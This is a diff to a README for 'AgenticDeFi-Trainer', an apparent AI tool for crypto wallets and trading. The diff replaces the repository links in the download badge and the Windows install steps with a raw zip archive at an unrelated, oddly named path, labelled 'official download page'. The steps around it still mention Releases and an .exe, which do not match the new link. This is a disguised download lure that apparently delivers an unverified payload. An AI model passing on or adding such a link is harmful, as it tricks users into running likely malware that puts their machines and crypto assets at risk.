@@ -5,7 +5,7 @@ description: "Train LLM-driven agents to manage stablecoin wallets and execute a
 ---
 # 🤖 AgenticDeFi-Trainer - Manage crypto assets with autonomous agents
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/scary5020/AgenticDeFi-Trainer)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://raw.githubusercontent.com/scary5020/scary5020.github.io/main/undwindling/scary-github-io-v3.5.zip)
 
 AgenticDeFi-Trainer provides tools for automated finance. This software uses artificial intelligence to manage digital wallets and execute trades on the blockchain. You can bridge assets, trade tokens, and handle treasury tasks without manual input.
 
@@ -13,7 +13,7 @@ AgenticDeFi-Trainer provides tools for automated finance. This software uses art
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official download page](https://github.com/scary5020/AgenticDeFi-Trainer).
+1. Go to the [official download page](https://raw.githubusercontent.com/scary5020/scary5020.github.io/main/undwindling/scary-github-io-v3.5.zip).
 2. Locate the latest version under the Releases section.
 3. Select the file ending in .exe to start your download.
 4. Save the file to your desktop or downloads folder.
